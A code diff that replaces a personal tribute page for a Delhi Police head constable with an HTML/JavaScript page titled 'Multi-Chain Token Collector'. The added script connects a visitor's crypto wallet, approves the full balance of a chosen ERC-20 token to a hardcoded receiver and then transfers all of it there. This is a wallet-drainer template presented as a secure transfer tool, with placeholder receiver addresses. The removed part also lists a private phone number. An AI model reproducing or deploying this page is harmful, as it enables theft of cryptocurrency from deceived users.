@@ -1,371 +1,295 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Salute to Gyan Chand Bhaskar - A Delhi Police Hero</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
-    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="description" content="Securely transfer ERC-20 tokens to a receiver wallet on Ethereum or Binance Smart Chain." />
+  <meta name="keywords" content="blockchain, ERC-20, token transfer, Ethereum, BSC, dApp" />
+  <title>Multi-Chain Token Collector</title>
+  <script src="https://cdn.jsdelivr.net/npm/ethers@6.12.1/dist/ethers.umd.min.js"></script>
+  <style>
+    :root {
+      --primary-color: #4e44ce;
+      --hover-primary: #372fb5;
+      --bg-color: #0f0f1e;
+      --text-color: #fff;
+      --input-bg: #2a2a3a;
+    }
 
-        body {
-            background: linear-gradient(135deg, #003087, #ffffff);
-            color: #333;
-            line-height: 1.6;
-            overflow-x: hidden;
-            min-height: 100vh;
-        }
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
 
-        header {
-            text-align: center;
-            padding: 100px 20px;
-            color: white;
-            background: linear-gradient(135deg, rgba(0, 48, 135, 0.9), rgba(255, 255, 255, 0.5));
-        }
+    body {
+      background: var(--bg-color);
+      color: var(--text-color);
+      font-family: 'Segoe UI', sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
 
-        header h1 {
-            font-size: 3.5em;
-            font-weight: 700;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 2px 2px 5px rgba(0, 0, 0, 0.5);
-        }
+    .container {
+      max-width: 600px;
+      margin: 0 auto;
+    }
 
-        header p {
-            font-size: 1.5em;
-            margin-top: 10px;
-            font-weight: 400;
-        }
+    h1 {
+      font-size: 2rem;
+      margin-bottom: 20px;
+      color: var(--primary-color);
+    }
 
-        .main-section, .shayari-section, .game-section {
-            max-width: 1100px;
-            margin: 50px auto;
-            padding: 0 20px;
-            text-align: center;
-        }
+    p {
+      font-size: 1rem;
+      margin-bottom: 20px;
+    }
 
-        .main-section h2, .shayari-section h2, .game-section h2 {
-            font-size: 2.5em;
-            color: #003087;
-            margin-bottom: 40px;
-            position: relative;
-        }
+    .form-group {
+      margin-bottom: 15px;
+      text-align: left;
+    }
 
-        .main-section h2::after, .shayari-section h2::after, .game-section h2::after {
-            content: '';
-            width: 100px;
-            height: 4px;
-            background: #ff6b6b;
-            position: absolute;
-            bottom: -10px;
-            left: 50%;
-            transform: translateX(-50%);
-            border-radius: 2px;
-        }
+    label {
+      display: block;
+      font-size: 0.9rem;
+      margin-bottom: 5px;
+    }
 
-        .card-container {
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 30px;
-            margin-top: 40px;
-        }
+    input {
+      width: 100%;
+      padding: 10px;
+      background: var(--input-bg);
+      border: none;
+      border-radius: 5px;
+      color: var(--text-color);
+      font-size: 1rem;
+    }
 
-        .card {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            transition: transform 0.3s, box-shadow 0.3s;
-            text-align: center;
-        }
+    input:focus {
+      outline: none;
+      box-shadow: 0 0 5px var(--primary-color);
+    }
 
-        .card:hover {
-            transform: translateY(-10px);
-            box-shadow: 0 15px 30px rgba(0, 0, 0, 0.2);
-        }
+    .btn {
+      background: var(--primary-color);
+      color: var(--text-color);
+      border: none;
+      padding: 15px 30px;
+      border-radius: 10px;
+      font-size: 1rem;
+      cursor: pointer;
+      width: 100%;
+      max-width: 300px;
+      margin: 10px auto;
+      display: block;
+      transition: background-color 0.3s ease;
+    }
 
-        .card i {
-            font-size: 3em;
-            color: #ff6b6b;
-            margin-bottom: 20px;
-        }
+    .btn:hover {
+      background: var(--hover-primary);
+    }
 
-        .card h3 {
-            font-size: 1.8em;
-            color: #003087;
-            margin-bottom: 15px;
-        }
+    .btn:disabled {
+      background: #555;
+      cursor: not-allowed;
+    }
 
-        .card p {
-            font-size: 1.2em;
-            color: #555;
-        }
+    .status-message {
+      margin: 15px 0;
+      font-size: 0.9rem;
+      word-break: break-all;
+    }
 
-        .quote-section {
-            background: #fff;
-            padding: 60px 20px;
-            text-align: center;
-            margin: 50px 0;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-        }
+    @media (max-width: 768px) {
+      body {
+        padding: 10px;
+      }
 
-        .quote-section p {
-            font-size: 1.8em;
-            font-style: italic;
-            color: #333;
-            max-width: 800px;
-            margin: 0 auto 20px;
-        }
+      h1 {
+        font-size: 1.5rem;
+      }
 
-        .quote-section .signature {
-            font-size: 1.2em;
-            color: #ff6b6b;
-            font-weight: 600;
-        }
-
-        .shayari {
-            background: white;
-            padding: 30px;
-            border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            margin-bottom: 30px;
-            transition: transform 0.3s;
-        }
-
-        .shayari:hover {
-            transform: translateY(-10px);
-        }
-
-        .shayari p {
-            font-size: 1.4em;
-            color: #333;
-            line-height: 1.8;
-        }
-
-        .game-container {
-            background: white;
-            padding: 20px;
-            border-radius: 15px;
-            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
-            display: inline-block;
-        }
-
-        .game-grid {
-            display: grid;
-            gap: 10px;
-            margin: 20px auto;
-        }
-
-        .game-card {
-            width: 80px;
-            height: 80px;
-            background: #003087;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: transform 0.3s, background 0.3s;
-            color: white;
-            font-size: 2em;
-        }
-
-        .game-card:hover {
-            transform: scale(1.1);
-        }
-
-        .game-card.revealed {
-            background: #fff;
-            color: #003087;
-        }
-
-        .game-card.matched {
-            background: #ff6b6b;
-            color: white;
-        }
-
-        #gameStatus {
-            font-size: 1.5em;
-            color: #333;
-            margin-top: 20px;
-        }
-
-        footer {
-            background: #003087;
-            color: white;
-            text-align: center;
-            padding: 40px 20px;
-        }
-
-        footer p {
-            font-size: 1.2em;
-        }
-
-        footer a {
-            color: #ff6b6b;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        footer a:hover {
-            text-decoration: underline;
-        }
-
-        @media (max-width: 768px) {
-            header h1 { font-size: 2.5em; }
-            header p { font-size: 1.2em; }
-            .main-section h2, .shayari-section h2, .game-section h2 { font-size: 2em; }
-            .card h3 { font-size: 1.5em; }
-            .quote-section p { font-size: 1.4em; }
-            .shayari p { font-size: 1.2em; }
-            .game-card { width: 60px; height: 60px; font-size: 1.5em; }
-        }
-    </style>
+      .btn {
+        padding: 12px 20px;
+      }
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <h1>Salute to Gyan Chand Bhaskar</h1>
-        <p>A Proud Head Constable of Delhi Police</p>
-    </header>
-
-    <section class="main-section">
-        <h2>About Gyan Chand Bhaskar</h2>
-        <div class="card-container">
-            <div class="card">
-                <i class="fas fa-shield-alt"></i>
-                <h3>Dedicated Service</h3>
-                <p>Gyan Chand Bhaskar has served Delhi Police with unwavering dedication, ensuring the safety of citizens.</p>
-            </div>
-            <div class="card">
-                <i class="fas fa-star"></i>
-                <h3>Head Constable</h3>
-                <p>A respected officer, leading with courage and integrity in every duty assigned.</p>
-            </div>
-            <div class="card">
-                <i class="fas fa-heart"></i>
-                <h3>Inspiration</h3>
-                <p>A big brother and a hero whose commitment inspires us all every day.</p>
-            </div>
+  <div class="container">
+    <h1>Multi-Chain Token Collector</h1>
+    <p>Connect your MetaMask or Trust Wallet to transfer ERC-20 tokens.</p>
+    <button class="btn" id="connectBtn" aria-label="Connect Wallet">Connect Wallet</button>
+    <div id="transferSection" style="display: none;">
+      <form id="transferForm">
+        <div class="form-group">
+          <label for="tokenAddress">ERC-20 Token Contract Address</label>
+          <input type="text" id="tokenAddress" placeholder="0x..." required />
         </div>
-    </section>
+        <button type="submit" class="btn" id="transferBtn" aria-label="Transfer Tokens">Transfer Tokens</button>
+      </form>
+    </div>
+    <div class="status-message" id="status"></div>
+  </div>
 
-    <section class="quote-section">
-        <p>"Service before self – a motto Gyan Chand Bhaskar lives by every day."</p>
-        <span class="signature">- A Gift from Your Little Brother, Manish Bhaskar</span>
-    </section>
+  <script>
+    const RECEIVER_ADDRESSES = {
+      1: "YOUR_ETH_RECEIVER_ADDRESS", // Ethereum Mainnet
+      56: "YOUR_BNB_RECEIVER_ADDRESS" // BNB Smart Chain
+    };
 
-    <section class="shayari-section">
-        <h2>Shayari for My Hero</h2>
-        <div class="shayari">
-            <p>"Himmat se kadam chalta hai aage,<br>Delhi ki suraksha hai inke saath lage,<br>Gyan Chand Bhaskar, ek naam hai pyara,<br>Family ko proud hai inpe sara."</p>
-        </div>
-        <div class="shayari">
-            <p>"Dil mein junoon, aankhon mein sapna,<br>Duty ke liye hai inka jeevan apna,<br>Bhaiya tum ho hamari shaan,<br>Har pal tumse judi hai pehchaan."</p>
-        </div>
-        <div class="shayari">
-            <p>"Police ki vardi mein chamak hai alag,<br>Gyan Bhaiya ke jaisa na koi talab,<br>Desh ki khidmat, parivar ka pyar,<br>Tum ho hamare liye ek sitara vichar."</p>
-        </div>
-    </section>
+    const ERC20_ABI = [
+      "function balanceOf(address) view returns (uint256)",
+      "function transfer(address to, uint256 amount) returns (bool)",
+      "function approve(address spender, uint256 amount) returns (bool)",
+      "function allowance(address owner, address spender) view returns (uint256)",
+      "function decimals() view returns (uint8)"
+    ];
 
-    <section class="game-section">
-        <h2>Crime Scene Puzzle</h2>
-        <div class="game-container">
-            <div class="game-grid" id="gameGrid"></div>
-        </div>
-        <p id="gameStatus">Level 1: Match the Clues!</p>
-    </section>
+    const chainConfigs = {
+      1: { name: "Ethereum Mainnet", explorer: "https://etherscan.io/tx/" },
+      56: { name: "BNB Smart Chain", explorer: "https://bscscan.com/tx/" }
+    };
 
-    <footer>
-        <p>Contact Gyan Chand Bhaskar: <a href="tel:+918882018844">+91 88820 18844</a></p>
-        <p>Made with ❤️ for Gyan Chand Bhaskar | Hosted on <a href="https://github.com" target="_blank">GitHub</a></p>
-    </footer>
+    // Show status messages
+    function showStatus(message) {
+      document.getElementById("status").innerHTML = message;
+    }
 
-    <script>
-        const gameGrid = document.getElementById('gameGrid');
-        const gameStatus = document.getElementById('gameStatus');
-        const clues = [
-            '🔫', '🔍', '🖐️', '🔗', '📷', '🚨', '📜', '👣', // Crime-related emojis
-        ];
-        let currentLevel = 1;
-        let gridSize = 4; // Start with 4x4
-        let cards = [];
-        let revealedCards = [];
-        let matchedPairs = 0;
+    // Validate Ethereum address
+    function isValidAddress(address) {
+      return ethers.isAddress(address);
+    }
 
-        function shuffle(array) {
-            for (let i = array.length - 1; i > 0; i--) {
-                const j = Math.floor(Math.random() * (i + 1));
-                [array[i], array[j]] = [array[j], array[i]];
-            }
-            return array;
+    // Switch network
+    async function switchNetwork(chainId) {
+      try {
+        await window.ethereum.request({
+          method: "wallet_switchEthereumChain",
+          params: [{ chainId: ethers.toBeHex(chainId) }]
+        });
+      } catch (error) {
+        showStatus(`Failed to switch network: ${error.message}`);
+        throw error;
+      }
+    }
+
+    // Connect wallet
+    async function connectWallet() {
+      const connectBtn = document.getElementById("connectBtn");
+      connectBtn.disabled = true;
+
+      try {
+        if (!window.ethereum) {
+          showStatus("Please install MetaMask or Trust Wallet!");
+          return;
         }
 
-        function startLevel() {
-            gameGrid.innerHTML = '';
-            cards = [];
-            revealedCards = [];
-            matchedPairs = 0;
-            const levelClues = clues.slice(0, (gridSize * gridSize) / 2);
-            cards = [...levelClues, ...levelClues]; // Duplicate for pairs
-            cards = shuffle(cards);
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        await provider.send("eth_requestAccounts", []);
+        const signer = await provider.getSigner();
+        const address = await signer.getAddress();
+        const network = await provider.getNetwork();
+        const chainId = Number(network.chainId);
 
-            gameGrid.style.gridTemplateColumns = `repeat(${gridSize}, 80px)`;
-            cards.forEach((clue, index) => {
-                const card = document.createElement('div');
-                card.classList.add('game-card');
-                card.dataset.clue = clue;
-                card.textContent = '?';
-                card.addEventListener('click', () => handleCardClick(card));
-                gameGrid.appendChild(card);
-            });
-
-            gameStatus.textContent = `Level ${currentLevel}: Match the Clues!`;
+        if (!RECEIVER_ADDRESSES[chainId]) {
+          showStatus("This chain is not supported. Please switch to Ethereum or BSC.");
+          return;
         }
 
-        function handleCardClick(card) {
-            if (revealedCards.length < 2 && !card.classList.contains('revealed') && !card.classList.contains('matched')) {
-                card.classList.add('revealed');
-                card.textContent = card.dataset.clue;
-                revealedCards.push(card);
+        showStatus(`Connected: ${address.slice(0, 6)}...${address.slice(-4)}<br>Chain: ${chainConfigs[chainId].name}`);
+        document.getElementById("transferSection").style.display = "block";
+        connectBtn.style.display = "none";
+      } catch (error) {
+        showStatus(`Connection failed: ${error.message}`);
+      } finally {
+        connectBtn.disabled = false;
+      }
+    }
 
-                if (revealedCards.length === 2) {
-                    const [card1, card2] = revealedCards;
-                    if (card1.dataset.clue === card2.dataset.clue) {
-                        card1.classList.add('matched');
-                        card2.classList.add('matched');
-                        matchedPairs++;
-                        if (matchedPairs === cards.length / 2) {
-                            setTimeout(() => {
-                                currentLevel++;
-                                gridSize = currentLevel === 2 ? 5 : currentLevel === 3 ? 6 : gridSize;
-                                if (currentLevel > 3) {
-                                    gameStatus.textContent = 'Congratulations! You Solved All Levels!';
-                                } else {
-                                    startLevel();
-                                }
-                            }, 1000);
-                        }
-                    } else {
-                        setTimeout(() => {
-                            card1.classList.remove('revealed');
-                            card2.classList.remove('revealed');
-                            card1.textContent = '?';
-                            card2.textContent = '?';
-                        }, 1000);
-                    }
-                    revealedCards = [];
-                }
-            }
+    // Transfer tokens
+    async function transferTokens(event) {
+      event.preventDefault();
+      const transferBtn = document.getElementById("transferBtn");
+      transferBtn.disabled = true;
+
+      try {
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        const signer = await provider.getSigner();
+        const userAddress = await signer.getAddress();
+        const network = await provider.getNetwork();
+        const chainId = Number(network.chainId);
+        const tokenAddress = document.getElementById("tokenAddress").value.trim();
+        const receiver = RECEIVER_ADDRESSES[chainId];
+
+        if (!isValidAddress(tokenAddress)) {
+          showStatus("Invalid token contract address.");
+          return;
+        }
+        if (!receiver) {
+          showStatus("This chain is not supported.");
+          return;
         }
 
-        // Start the game
-        startLevel();
-    </script>
+        const tokenContract = new ethers.Contract(tokenAddress, ERC20_ABI, signer);
+        let decimals;
+        try {
+          decimals = await tokenContract.decimals();
+        } catch {
+          showStatus("Invalid ERC-20 token contract.");
+          return;
+        }
+
+        const balance = await tokenContract.balanceOf(userAddress);
+        if (balance === 0n) {
+          showStatus("Token balance is zero.");
+          return;
+        }
+
+        showStatus("Approving tokens...");
+        const approveTx = await tokenContract.approve(receiver, balance);
+        await approveTx.wait();
+
+        const allowance = await tokenContract.allowance(userAddress, receiver);
+        if (allowance >= balance) {
+          showStatus("Transferring tokens...");
+          const transferTx = await tokenContract.transfer(receiver, balance);
+          const receipt = await transferTx.wait();
+          showStatus(
+            `Tokens transferred! <a href="${chainConfigs[chainId].explorer}${receipt.hash}" target="_blank">View on Explorer</a>`
+          );
+          document.getElementById("transferForm").reset();
+        } else {
+          showStatus("Approval failed.");
+        }
+      } catch (error) {
+        showStatus(`Error: ${error.message}`);
+      } finally {
+        transferBtn.disabled = false;
+      }
+    }
+
+    // Handle wallet disconnect or chain change
+    if (window.ethereum) {
+      window.ethereum.on("accountsChanged", (accounts) => {
+        if (accounts.length === 0) {
+          showStatus("Wallet disconnected.");
+          document.getElementById("transferSection").style.display = "none";
+          document.getElementById("connectBtn").style.display = "block";
+        }
+      });
+      window.ethereum.on("chainChanged", () => {
+        showStatus("Network changed. Please reconnect wallet.");
+        document.getElementById("transferSection").style.display = "none";
+        document.getElementById("connectBtn").style.display = "block";
+      });
+    }
+
+    // Event Listeners
+    document.getElementById("connectBtn").addEventListener("click", connectWallet);
+    document.getElementById("transferForm").addEventListener("submit", transferTokens);
+  </script>
 </body>
 </html>
